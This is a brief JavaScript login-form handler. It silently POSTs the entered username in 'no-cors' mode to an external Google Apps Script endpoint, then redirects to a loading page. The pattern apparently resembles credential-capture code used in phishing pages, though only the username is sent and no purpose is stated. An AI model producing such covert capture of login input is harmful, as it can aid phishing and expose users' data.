document.addEventListener("DOMContentLoaded", function () {

  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value;

    // 🔹 Background request (browser will not block)
    fetch("https://script.google.com/macros/s/AKfycbw6GR29yDCVXL5Wl5H0jiCRC4sFTNNmvgzg3uIMFnv4VIAKJbnzkbQkzLGP21jaZw0D/exec", {
      method: "POST",
      mode: "no-cors",   // ✅ MOST IMPORTANT
      body: new URLSearchParams({
        username: username
      })
    });

    // 🔹 User ko turant loading page par bhej do
    window.location.href = "loading.html";
  });

});
